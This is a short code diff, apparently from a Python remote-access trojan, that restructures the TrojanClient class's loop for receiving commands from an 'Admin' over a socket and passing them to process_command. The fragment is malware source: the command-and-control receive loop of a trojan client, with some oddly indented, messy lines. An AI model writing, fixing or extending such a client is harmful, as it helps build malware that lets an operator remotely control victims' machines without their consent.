@@ -217,13 +217,17 @@ class TrojanClient:
             except Exception:
                 self.connected = False        
  
-             data = self.sock.recv(4096).decode()
-             if not data: break
-             self.process_command(data)
- except Exception as e:
-     print(f"[CLIENT] Error: {e}")
-     break
-
+def listen_for_commands(self):
+        """Receives commands from the admin."""
+        while self.connected:
+            try:
+                data = self.sock.recv(4096).decode()
+                if not data:
+                    break
+                self.process_command(data)
+            except Exception as e:
+                print(f"[CLIENT] Error: {e}")
+                break            
  def process_command(self, command: str):
      """Interprets commands from Admin."""
      cmd_type = command.split(':')[0]
